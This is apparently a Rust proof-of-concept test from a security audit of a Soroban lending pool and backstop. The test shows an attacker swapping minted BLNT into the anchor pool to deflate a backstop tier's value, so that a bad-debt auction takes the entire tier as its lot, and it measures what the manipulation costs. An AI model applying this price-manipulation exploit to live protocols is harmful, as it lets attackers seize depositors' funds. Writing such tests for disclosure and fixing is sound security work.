#![cfg(test)]
#![allow(clippy::zero_prefixed_literal)]

use pool::{PoolDataKey, Request, RequestType};
use soroban_sdk::{map, testutils::Address as AddressTestTrait, vec, Address};
use test_suites::{
    create_fixture_with_data,
    test_fixture::{TokenIndex, SCALAR_7},
};

/// The opposite skew: pushing BLNT into the anchor deflates every tier's
/// reported value. `allocate_bad_debt_tier` returns the *entire* tier once
/// `value <= 1.2 * debt_value`, so deflation directly balloons the bad-debt lot.
#[test]
fn poc_anchor_swap_deflates_every_tier_value() {
    for swaps in [1u32, 2, 3, 4, 6] {
        let fixture = create_fixture_with_data(false);
        let pool_address = fixture.pools[0].pool.address.clone();
        let pool = &fixture.pools[0].pool;
        let blnt = &fixture.tokens[TokenIndex::BLNT];
        let usdc = &fixture.tokens[TokenIndex::USDC];
        let stable = &fixture.tokens[TokenIndex::STABLE];
        let xlm = &fixture.tokens[TokenIndex::XLM];
        let attacker = fixture.users[0].clone();

        let before = fixture.backstop.pool_data(&pool_address);
        let honest_value = before.tiers.get(1).unwrap().value;
        let tokens = before.tiers.get(1).unwrap().tokens;
        std::println!("BlntUsdc tier: tokens={} value={}", tokens, honest_value);

        // Seed a real backstop liability through the production pool path. At
        // the honest valuation its 120% target is smaller than the tier, while
        // even one anchor-deflation swap makes the target consume the whole
        // tier.
        let borrower = Address::generate(&fixture.env);
        let stable_scalar = 10i128.pow(stable.decimals());
        let debt_amount = 25_000 * stable_scalar;
        stable.mint(&attacker, &(30_000 * stable_scalar));
        pool.submit(
            &attacker,
            &attacker,
            &attacker,
            &vec![
                &fixture.env,
                Request {
                    request_type: RequestType::Supply as u32,
                    address: stable.address.clone(),
                    amount: 30_000 * stable_scalar,
                },
            ],
        );
        xlm.mint(&borrower, &(500_000 * SCALAR_7));
        let mut borrower_positions = pool.submit(
            &borrower,
            &borrower,
            &borrower,
            &vec![
                &fixture.env,
                Request {
                    request_type: RequestType::SupplyCollateral as u32,
                    address: xlm.address.clone(),
                    amount: 500_000 * SCALAR_7,
                },
                Request {
                    request_type: RequestType::Borrow as u32,
                    address: stable.address.clone(),
                    amount: debt_amount,
                },
            ],
        );
        fixture.env.as_contract(&pool.address, || {
            borrower_positions.collateral = map![&fixture.env];
            fixture.env.storage().persistent().set(
                &PoolDataKey::Positions(borrower.clone()),
                &borrower_positions,
            );
        });
        pool.bad_debt(&borrower);

        let backstop_positions = pool.get_positions(&fixture.backstop.address);
        let stable_index = fixture.pools[0].reserves[&TokenIndex::STABLE];
        let debt_shares = backstop_positions.liabilities.get_unchecked(stable_index);
        let debt_value = pool
            .get_reserve(&stable.address)
            .to_asset_from_d_token(&fixture.env, debt_shares)
            * SCALAR_7
            / stable_scalar;
        let target_value = (debt_value * 6 + 4) / 5;
        assert!(honest_value > target_value);

        blnt.mint(&attacker, &(2_000_000_000 * SCALAR_7));
        let blnt_before = blnt.balance(&attacker);
        let usdc_before = usdc.balance(&attacker);
        for _ in 0..swaps {
            let reserve = fixture.lp.get_balance(&blnt.address);
            fixture.lp.swap_exact_amount_in(
                &blnt.address,
                &(reserve / 4),
                &usdc.address,
                &0,
                &i128::MAX,
                &attacker,
            );
        }
        let after = fixture.backstop.pool_data(&pool_address);
        let skewed_value = after.tiers.get(1).unwrap().value;
        std::println!(
            "after BLNT-in skew: value={} ({}% of honest)",
            skewed_value,
            skewed_value * 100 / honest_value
        );
        assert!(skewed_value <= target_value);

        let tier_token = fixture
            .backstop
            .backstop_token(&backstop::BackstopTier::SecondLoss, &pool_address);
        let auction = pool.new_auction(
            &1,
            &fixture.backstop.address,
            &vec![&fixture.env],
            &vec![&fixture.env],
            &100,
        );
        assert_eq!(auction.bid.len(), 1);
        assert_eq!(
            auction.bid.get_unchecked(stable.address.clone()),
            debt_shares
        );
        assert_eq!(auction.lot.len(), 1);
        assert_eq!(auction.lot.keys().get_unchecked(0), tier_token);
        assert_eq!(auction.lot.get_unchecked(tier_token.clone()), tokens);

        // unwind
        let mut usdc_left = usdc.balance(&attacker) - usdc_before;
        while usdc_left > 0 {
            let reserve = fixture.lp.get_balance(&usdc.address);
            let amt = core::cmp::min(usdc_left, reserve / 4);
            if amt == 0 {
                break;
            }
            fixture.lp.swap_exact_amount_in(
                &usdc.address,
                &amt,
                &blnt.address,
                &0,
                &i128::MAX,
                &attacker,
            );
            usdc_left -= amt;
        }
        let blnt_cost = blnt_before - blnt.balance(&attacker);
        std::println!("round-trip BLNT cost = {} BLNT", blnt_cost / SCALAR_7);
        std::println!(
            "restored tier value = {}",
            fixture
                .backstop
                .pool_data(&pool_address)
                .tiers
                .get(1)
                .unwrap()
                .value
        );

        // Auction creation freezes the selected tier and full-tier lot even
        // after the anchor reserves return to their honest composition.
        let stored = pool.get_auction(&1, &fixture.backstop.address);
        assert_eq!(stored.lot.get_unchecked(tier_token), tokens);

        std::println!(
            "swaps={} -> value {}% of honest; BLNT round-trip cost ~ ${}; whole-tier \
         threshold: bad debt >= ${}; actual ${} debt stores all {} LP (~${})",
            swaps,
            skewed_value * 100 / honest_value,
            blnt_cost / 10 / SCALAR_7,
            skewed_value * 5 / 6 / SCALAR_7,
            debt_value / SCALAR_7,
            tokens / SCALAR_7,
            honest_value / SCALAR_7,
        );
    }
}
